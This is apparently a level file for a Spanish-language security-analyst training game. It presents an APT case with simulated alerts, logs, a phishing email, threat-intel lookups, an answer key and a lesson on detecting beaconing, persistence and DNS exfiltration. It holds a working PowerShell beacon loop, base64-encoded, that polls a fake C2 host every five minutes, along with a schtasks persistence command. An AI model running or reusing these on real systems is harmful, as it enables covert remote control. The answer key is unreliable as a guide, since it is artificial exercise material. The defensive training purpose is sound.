import { dnsLogTunel } from "./helpers.js";

// ============================================================
// Caso 07 — «La conexión fantasma» (APT)
// Cadena completa de un grupo organizado: phishing inicial →
// beaconing DNS → persistencia con tarea programada →
// movimiento lateral SMB → exfiltración por DNS.
// La lección: los APT tienen paciencia; el dwell time importa.
// ============================================================

// Comando PowerShell -enc de la tarea programada (beacon cada 5 min)
const cmdBeacon =
  "$c='http://cdn-updates-ms.com/upd';while(1){try{$r=Invoke-WebRequest $c -UseBasicParsing;if($r.Content){[System.IO.File]::AppendAllText('C:\\ProgramData\\s.log',$r.Content)}}catch{};Start-Sleep 300}";
const encBeacon = (() => {
  const bytes = [];
  for (let i = 0; i < cmdBeacon.length; i++) {
    const c = cmdBeacon.charCodeAt(i);
    bytes.push(c & 0xff, (c >> 8) & 0xff);
  }
  let bin = "";
  for (const b of bytes) bin += String.fromCharCode(b);
  return btoa(bin);
})();

export default {
  id: "apt-01",
  titulo: "«La conexión fantasma» — APT: beaconing DNS y movimiento lateral",
  severidad: "CRÍTICA",
  nivel: 4,
  sla: 900, // 15 minutos
  xp: 550,
  briefing:
    "El SIEM ha encendido todas las alarmas a la vez: consultas DNS masivas con subdominios " +
    "aleatorios desde HOST-210, una tarea programada recién creada que ejecuta PowerShell " +
    "codificado cada 5 minutos, y conexiones SMB hacia el servidor de archivos.\n\n" +
    "Lo peor: mirando atrás, el acceso inicial fue hace TRES SEMANAS. Esto no es un script " +
    "kiddie con prisa: es un grupo organizado con paciencia, persistencia y movimiento lateral. " +
    "Investiga la cadena completa y corta la persistencia antes de que toque los proyectos de fusión.",

  fs: {
    "/opt/siem/alerts.json": JSON.stringify(
      [
        {
          id: "ALT-701",
          sev: "HIGH",
          fuente: "dns",
          ts: "2026-02-14T02:12:03Z",
          titulo: "Volumen anómalo de consultas DNS a dominio desconocido",
          detalle:
            "HOST-210 (r.gutierrez) resuelve cientos de subdominios aleatorios de cdn-updates-ms.com. Patrón compatible con beaconing DNS o túnel de exfiltración.",
          estado: "ABIERTA",
        },
        {
          id: "ALT-702",
          sev: "HIGH",
          fuente: "edr",
          ts: "2026-02-14T02:14:40Z",
          titulo: "Tarea programada sospechosa creada en HOST-210",
          detalle:
            "schtasks /create con nombre 'OneDriveSync' que ejecuta powershell.exe -enc (comando codificado). Creada fuera de ventana de mantenimiento de TI.",
          estado: "ABIERTA",
        },
        {
          id: "ALT-703",
          sev: "CRITICAL",
          fuente: "siem",
          ts: "2026-02-14T02:31:55Z",
          titulo: "Conexiones SMB salientes hacia srv-files-02",
          detalle:
            "HOST-210 accede a \\\\srv-files-02\\proyectos_fusion con credenciales de r.gutierrez. La cuenta no tiene rol que justifique ese acceso. Movimiento lateral en curso.",
          estado: "ABIERTA",
        },
        {
          id: "ALT-704",
          sev: "CRITICAL",
          fuente: "edr",
          ts: "2026-02-14T02:44:18Z",
          titulo: "Exfiltración de datos por túnel DNS",
          detalle:
            "El proceso powershell.exe de HOST-210 genera consultas TXT de alta entropía hacia cdn-updates-ms.com. Contenido de archivos leídos de proyectos_fusion codificado en subdominios.",
          estado: "ABIERTA",
        },
      ],
      null,
      2
    ),

    // Mezcla de tráfico legítimo con el túnel DNS del beacon
    "/var/log/dns.log": [
      "Feb 14 02:10:02 dns01 queries: client 10.0.4.210#53000: query: cdn-updates-ms.com IN A",
      "Feb 14 02:10:02 dns01 queries: client 10.0.4.210#53000: query: cdn-updates-ms.com IN A",
      "Feb 14 02:10:31 dns01 queries: client 10.0.4.210#53000: query: www.office.com IN A",
      "Feb 14 02:11:04 dns01 queries: client 10.0.4.201#53000: query: www.google.com IN A",
      ...dnsLogTunel("cdn-updates-ms.com", 34, "10.0.4.210").split("\n"),
      "Feb 14 02:15:06 dns01 queries: client 10.0.4.210#53000: query: cdn-updates-ms.com IN A",
      "Feb 14 02:20:05 dns01 queries: client 10.0.4.210#53000: query: cdn-updates-ms.com IN A",
    ].join("\n"),

    "/var/log/tasks.log": [
      "Feb 14 02:14:33 HOST-210 schtasks[8402]: Successfully created scheduled task: OneDriveSync",
      "Feb 14 02:14:34 HOST-210 schtasks[8402]: Task OneDriveSync: Run 'powershell.exe -enc " + encBeacon + "' every 5 minutes, as user r.gutierrez",
      "Feb 14 02:14:35 HOST-210 schtasks[8402]: Task OneDriveSync: Trigger: repetition interval 5 minutes, indefinitely",
      "Feb 14 02:19:36 HOST-210 Microsoft-Windows-TaskScheduler[101]: Task OneDriveSync started (run powershell.exe)",
      "Feb 14 02:24:37 HOST-210 Microsoft-Windows-TaskScheduler[101]: Task OneDriveSync started (run powershell.exe)",
    ].join("\n"),

    "/var/log/edr.json": [
      '{"ts":"2026-02-14T02:14:33Z","host":"HOST-210","event":"process_start","proc":"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe","args":"-enc ' + encBeacon + '","parent":"cmd.exe","user":"r.gutierrez"}',
      '{"ts":"2026-02-14T02:14:35Z","host":"HOST-210","event":"process_start","proc":"schtasks.exe","args":"/create /tn OneDriveSync /tr powershell -enc ' + encBeacon + ' /sc minute /mo 5","parent":"cmd.exe"}',
      '{"ts":"2026-02-14T02:31:50Z","host":"HOST-210","event":"network_out","proc":"powershell.exe","dst":"91.240.118.77:443","proto":"TCP","bytes":1824}',
      '{"ts":"2026-02-14T02:31:52Z","host":"HOST-210","event":"smb_open","proc":"powershell.exe","share":"\\\\\\\\srv-files-02\\\\proyectos_fusion","path":"fusion_plan_2027.xlsx","user":"r.gutierrez"}',
      '{"ts":"2026-02-14T02:31:55Z","host":"HOST-210","event":"smb_read","proc":"powershell.exe","share":"\\\\\\\\srv-files-02\\\\proyectos_fusion","file":"fusion_plan_2027.xlsx","bytes":409600}',
      '{"ts":"2026-02-14T02:44:18Z","host":"HOST-210","event":"network_out","proc":"powershell.exe","dst":"10.0.0.53:53","proto":"UDP","bytes":6144,"note":"consultas TXT de alta entropía"}',
    ].join("\n"),

    "/var/log/proxy.log": [
      "Feb 14 02:09:58 squid[1044]: 10.0.4.210 - GET http://cdn-updates-ms.com/upd - TCP_MISS/200 application/octet-stream",
      "Feb 14 02:09:59 squid[1044]: 10.0.4.210 - GET http://cdn-updates-ms.com/upd - TCP_MISS/200 application/octet-stream",
      "Feb 14 02:10:00 squid[1044]: 10.0.4.210 - GET http://cdn-updates-ms.com/upd - TCP_MISS/200 application/octet-stream",
      "Feb 14 02:15:00 squid[1044]: 10.0.4.210 - GET http://cdn-updates-ms.com/upd - TCP_MISS/200 application/octet-stream",
      "Feb 14 02:20:01 squid[1044]: 10.0.4.210 - GET http://cdn-updates-ms.com/upd - TCP_MISS/200 application/octet-stream",
    ].join("\n"),

    "/home/analista/casos/evidencias/headers-apt.txt": [
      "Return-Path: <bounce@soporte.office365-suite.info>",
      "Received: from mail.office365-suite.info (185.220.101.87) by mx01.cibercorp.com",
      "From: \"Soporte Microsoft 365\" <soporte@office365-suite.info>",
      "To: r.gutierrez@cibercorp.com",
      "Reply-To: soporte@office365-suite.info",
      "Subject: Actualización de seguridad Office 365 — acción requerida",
      "Date: Fri, 23 Jan 2026 09:12:03 +0100",
      "Message-ID: <20260123091203.7a1b2c@mail.office365-suite.info>",
      "X-Mailer: Microsoft Outlook Express 6.00.2900.5931",
      "",
      "Nota del analista:",
      "  - El enlace apunta a cdn-updates-ms.com, NO a microsoft.com ni office.com.",
      "  - El dominio de soporte (office365-suite.info) se registró hace 5 días.",
      "  - Outlook Express 6: señuelo clásico para parecer un correo antiguo y legítimo.",
    ].join("\n"),

    // Binario del downloader recuperado (evidencia)
    "/home/analista/casos/evidencias/update.exe": [
      "MZ\\u0090\\u0000\\u0003\\u0000\\u0000\\u0000\\u0004\\u0000\\u0000\\u0000\\uffff\\u0000\\u0000\\u0000\\u00b8\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000",
      "PE\\u0000\\u0000\\u0000\\u008c\\u0000",
      "This program cannot be run in DOS mode.",
      "update.exe\\u0000",
      "http://cdn-updates-ms.com/upd\\u0000",
      "HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\u0000",
      "OneDriveSync\\u0000",
      "powershell.exe -enc \\u0000" + encBeacon + "\\u0000",
      "\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000",
    ].join("\\u0000"),

    "/home/analista/casos/evidencias/README.txt":
      "Caso #CASE-4401 — APT en HOST-210 (r.gutierrez).\\n" +
      "Fuentes: /opt/siem/alerts.json, /var/log/dns.log, /var/log/tasks.log,\\n" +
      "         /var/log/edr.json, /var/log/proxy.log\\n" +
      "Evidencia recuperada: update.exe (NO ejecutar)\\n" +
      "Investiga con: cat, grep, strings, file, decode, whois, dig, vt, md5sum",
  },

  correos: [
    {
      id: 1,
      de: "soporte@office365-suite.info",
      para: "r.gutierrez@cibercorp.com",
      asunto: "Actualización de seguridad Office 365 — acción requerida",
      fecha: "23 Ene 2026 09:12",
      estado: "LEÍDO (abierto por r.gutierrez)",
      adjunto: "ninguno (enlace en el cuerpo)",
      headers: "/home/analista/casos/evidencias/headers-apt.txt",
      cuerpo: [
        "Estimado usuario,",
        "",
        "Su cliente de Office 365 quedará desactualizado el próximo lunes. Descargue e instale",
        "la actualización de seguridad desde el enlace oficial de Microsoft:",
        "",
        "    https://cdn-updates-ms.com/update.exe",
        "",
        "Si no completa la instalación, su cuenta podría quedar suspendida temporalmente.",
        "",
        "Equipo de Soporte — Microsoft 365",
        "",
        "------------------------------------------------------------------",
        "[Nota del analista]",
        "• El dominio real de Microsoft es microsoft.com u office.com, nunca cdn-updates-ms.com.",
        "• Revisa mail.log: esta campaña entró semanas antes de las alertas de hoy.",
      ].join("\n"),
    },
    {
      id: 2,
      de: "newsletter@linkedin.com",
      para: "r.gutierrez@cibercorp.com",
      asunto: "Tus ofertas laborales de la semana",
      fecha: "13 Feb 2026 16:40",
      estado: "NO LEÍDO",
      adjunto: "ninguno",
      cuerpo: "Boletín de ofertas de LinkedIn. Puedes darte de baja en el enlace del pie.",
    },
  ],

  alertas: [
    { id: "ALT-701", sev: "HIGH", fuente: "dns", titulo: "Volumen anómalo de consultas DNS a dominio desconocido" },
    { id: "ALT-702", sev: "HIGH", fuente: "edr", titulo: "Tarea programada sospechosa creada en HOST-210" },
    { id: "ALT-703", sev: "CRITICAL", fuente: "siem", titulo: "Conexiones SMB salientes hacia srv-files-02" },
    { id: "ALT-704", sev: "CRITICAL", fuente: "edr", titulo: "Exfiltración de datos por túnel DNS" },
  ],

  dominios: {
    "cdn-updates-ms.com": {
      ip: "91.240.118.77",
      registrado: "Hace 23 días (22 Ene 2026)",
      registrador: "Namecheap (datos de registro ocultos)",
      whois: [
        "Domain: cdn-updates-ms.com",
        "Registrar: Namecheap Inc. - datos del titular ocultos",
        "Registered: 2026-01-22 (hace 23 DÍAS)",
        "Registrant: WhoisGuard Protected",
        "Name Server: ns1.hostanon.net, ns2.hostanon.net",
        "IP actual: 91.240.118.77",
        "ASN: AS44477 - hosting tolerante con malware",
        "Nota: nombre que imita a un CDN de Microsoft (update-ms). Registrado 4 días",
        "antes del correo de phishing a r.gutierrez: infraestructura dedicada a la campaña.",
      ].join("\n"),
      vt: {
        repos: 21,
        maliciosos: 19,
        deteccion: "MALICIOSO (19/21)",
        familia: "C2 — beacon de grupo APT",
        comentarios: "Dominio de mando y control. Asociado a túneles DNS y campañas de phishing con actualizaciones falsas.",
      },
    },
    "microsoft.com": {
      ip: "20.112.52.29",
      registrado: "Hace 34 años",
      registrador: "CSC Corporate Domains",
      whoi: "Dominio legítimo de Microsoft. cdn-updates-ms.com NO es un subdominio suyo: es un lookalike.",
      vt: { repos: 95, maliciosos: 0, deteccion: "LIMPIO (0/95)" },
    },
  },

  ips: {
    "91.240.118.77": {
      pais: "🇱🇻 Letonia (hosting anónimo)",
      asn: "AS44477",
      reputacion: "MALICIOSA — listada en 14 blacklists (Spamhaus, ThreatFox, AbuseIPDB). C2 conocido.",
      whois: "Red de hosting de alto riesgo, sin registrante real. Misma infraestructura que otras campañas APT.",
    },
    "10.0.4.210": {
      pais: "🏢 Red interna",
      asn: "Interno",
      reputacion: "HOST-210 — estación de trabajo de r.gutierrez (Compras). Comprometida.",
    },
    "10.0.4.22": {
      pais: "🏢 Red interna",
      asn: "Interno",
      reputacion: "srv-files-02 — servidor de archivos con proyectos de fusión. Objetivo del movimiento lateral.",
    },
  },

  urls: {
    "http://cdn-updates-ms.com/upd":
      "HTTP/1.1 200 OK — cuerpo vacío (respuesta de comando del C2). El beacon pregunta cada 5 minutos y ejecuta lo que devuelva el servidor.",
    "http://cdn-updates-ms.com/update.exe":
      "HTTP/1.1 200 OK — PE32 executable (GUI) Intel 80386, 2 secciones. El downloader que instaló la persistencia.",
  },

  hashes: {
    "b7e2c9a4f1d608315a2b4c6d8e0f1234567890abcdef0123456789abcdef1234": {
      nombre: "update.exe",
      tipo: "SHA-256",
      vt: {
        repos: 44,
        maliciosos: 41,
        deteccion: "MALICIOSO (41/44)",
        familia: "Downloader → Beacon C2",
      },
      nota: "Instalador de persistencia: crea la tarea OneDriveSync y el beacon cada 5 minutos hacia el C2.",
    },
  },

  archivosVt: {
    "/home/analista/casos/evidencias/update.exe": {
      nombre: "update.exe",
      familia: "Downloader → Beacon C2",
      deteccion: "MALICIOSO (41/44)",
      nota: "El ejecutable del phishing inicial. Descarga el payload del C2 y programa el beacon como tarea 'OneDriveSync'.",
    },
  },

  correctas: {
    bloquear: ["dominio:cdn-updates-ms.com", "ip:91.240.118.77"],
    aislar: ["host:HOST-210"],
    deshabilitar: ["usuario:r.gutierrez"],
    escalar: true,
    cerrar: false,
  },

  incorrectas: [
    "bloquear|dominio:microsoft.com",
    "bloquear|dominio:cibercorp.com",
    "aislar|host:srv-files-02",
    "deshabilitar|usuario:m.garcia",
  ],

  eventos: [
    {
      en: 240,
      tipo: "alerta",
      sev: "CRITICAL",
      titulo: "Lectura de datos confidenciales en curso",
      detalle: "fusion_plan_2027.xlsx (409 KB) leído desde \\\\srv-files-02\\proyectos_fusion por HOST-210. El túnel DNS lo está exfiltrando en trozos.",
    },
    {
      en: 480,
      tipo: "msg",
      titulo: "Responsable de infraestructura",
      detalle: "«La tarea 'OneDriveSync' no la creó nadie de TI. Ese nombre y el -enc me suenan: lo vi en un informe de un cliente que sufrió un grupo APT. Tenéis poco tiempo.»",
    },
  ],

  pistas: [
    "Mira las alertas (`alertas`) y el log DNS: un dominio repite consultas con subdominios aleatorios. ¿Cuál?",
    "La tarea programada ejecuta PowerShell codificado. Extrae la cadena con `strings` sobre los logs y decodifícala con `decode`.",
    "El dominio cdn-updates-ms.com imita a un CDN de Microsoft. `whois` y `dig` lo delatan: registrado 4 días antes del phishing.",
    "Responde: bloquea el dominio y la IP del C2, aísla HOST-210, deshabilita la cuenta comprometida y escala a CSIRT.",
  ],

  leccion: {
    titulo: "APT: paciencia, persistencia y movimiento lateral",
    mitre: ["T1566.002", "T1105", "T1053.005", "T1071.004", "T1021.002", "T1048.003"],
    resumen:
      "Tres semanas de dwell time: el atacante entró con un correo de 'actualización de Office' (enlace a un dominio que imita a un CDN de Microsoft), " +
      "descargó un downloader que instaló persistencia como tarea programada ('OneDriveSync', PowerShell codificado cada 5 minutos) y desde entonces " +
      "hizo beaconing DNS y movimiento lateral SMB hacia el servidor de proyectos de fusión, exfiltrando los datos en trozos codificados en subdominios DNS. " +
      "Ninguna alerta individual gritaba: fue la correlación la que lo delató.",
    deteccion:
      "- DNS: consultas TXT con subdominios de alta entropía y volumen regular = beaconing o túnel (correlación de ALT-701 con ALT-704).\\n" +
      "- Tareas programadas nuevas con nombres inocuos (OneDriveSync) que ejecutan powershell -enc.\\n" +
      "- powershell.exe haciendo SMB a un share de otro servidor: la combinación delata movimiento lateral.\\n" +
      "- El acceso inicial puede estar semanas atrás: busca el correo de phishing y el primer binario (update.exe).\\n" +
      "- Los C2 de APT usan dominios que imitan a CDN/servicios legítimos: comprueba la FECHA de registro y el ASN.",
    respuesta:
      "1. Bloquear el dominio y la IP del C2 en firewall/DNS (corta el beacon y la exfiltración).\\n" +
      "2. Aislar HOST-210 de la red sin apagarlo (conserva evidencias para forense).\\n" +
      "3. Deshabilitar la cuenta comprometida (r.gutierrez) y rotar credenciales del segmento.\\n" +
      "4. Eliminar la persistencia: tarea OneDriveSync, entrada de Run y el binario update.exe.\\n" +
      "5. Determinar el alcance: ¿qué más leyó el túnel DNS? ¿a qué otros hosts llegó?\\n" +
      "6. Escalar a CSIRT: un APT con dwell time de semanas exige hunt completo, no solo contención.",
    aprendizaje: [
      "Los APT no tienen prisa: el dwell time medio supera las dos semanas. Toda alerta merece mirar atrás.",
      "La persistencia más silenciosa usa herramientas del sistema (schtasks + PowerShell): Living Off the Land.",
      "El DNS es el canal que casi nadie vigila: subdominios aleatorios de un dominio joven = señal roja.",
      "Correlaciona: una alerta es ruido; cuatro apuntando al mismo host y dominio son una intrusión.",
      "Documenta la cadena completa (entrada → persistencia → lateral → exfil): es lo que pide un informe de IR.",
    ],
    glosario: ["APT", "Beaconing", "Persistencia", "Tarea programada", "Living Off the Land", "Movimiento lateral", "C2", "Túnel DNS", "Dwell time"],
  },
};
